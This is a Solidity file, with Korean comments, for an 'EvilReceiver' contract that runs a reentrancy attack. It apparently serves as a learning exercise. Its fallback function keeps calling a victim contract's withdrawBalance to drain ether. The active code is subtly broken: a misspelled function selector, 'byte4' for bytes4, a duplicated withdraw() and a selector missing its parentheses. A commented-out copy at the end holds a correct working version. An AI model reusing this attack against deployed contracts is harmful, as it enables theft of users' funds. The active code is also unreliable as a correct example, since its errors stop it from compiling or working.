pragma solidity ^0.4.25;

contract EvilReceiver {
    // 공격 대상 계약의 어드레스
    address public target;

    // 메시지 출력용 이벤트
    event MessageLog(string);

    // 잔액 확인용 이벤트
    event BalanceLog(uint);

    /// 생성자
    function EvilReceiver(address _target) {
        target = _target;
    }

    /// Fallback 함수
    function() payable {
        BalanceLog(this.balance);

        // VictimBalance의 withdrawBalance를 호출
        if(!msg.sender.call.value(0)(bytes4(sha3("withdrawBalace()")))) {
            MessageLog("FAIL");
        } else {
            MessageLog("SUCCESS");
        }
    }

    /// EOA로부터 송금받을 때 사용하는 함수
    function addBalace() public payable {

    }

    /// 공격 대상으로 송금할 때 사용하는 함수
    function sendEthToTarget() public {
        if(!target.call.value(1 ether)(byte4(sha3("addToBalance()")))) {
            throw;
        }
    }

    /// 공격 대상에서 인출할 때 사용하는 함수
    function withdraw() public {
        if(!target.call.value(0)(byte4(sha3("withdrawBalance()")))){
            throw;
        }
    }

    /// 공격 대상에서 인출할 때 사용하는 함수
    function withdraw() public {
        if(!target.call.value(0)(byte4(sha3("withdrawBalance")))) {
            throw;
        }
    }
}


// pragma solidity ^0.4.11;
// contract EvilReceiver {
    
//     address public target;
    
//     event MessageLog(string);
    
//     event BalanceLog(uint);
    
//     function EvilReceiver(address _target){
//         target = _target;
//     }
    
//     function() payable{
//         BalanceLog(this.balance);
        
//         if(!msg.sender.call.value(0)(bytes4(sha3("withdrawBalance()")))){
//             MessageLog("Fail");
//         }else{
//             MessageLog("SUCCESS");
//         }
//     }
    
//     function addBalance() public payable{
        
//     }
    
//     function sendEthToTarget() public {
//         if(!target.call.value(1 ether)(bytes4(sha3("addToBalance()")))){ throw; }
//     }
    
//     function withdraw() public {
//         if(!target.call.value(0)(bytes4(sha3("withdrawBalance()")))) {throw;}
//     }
// }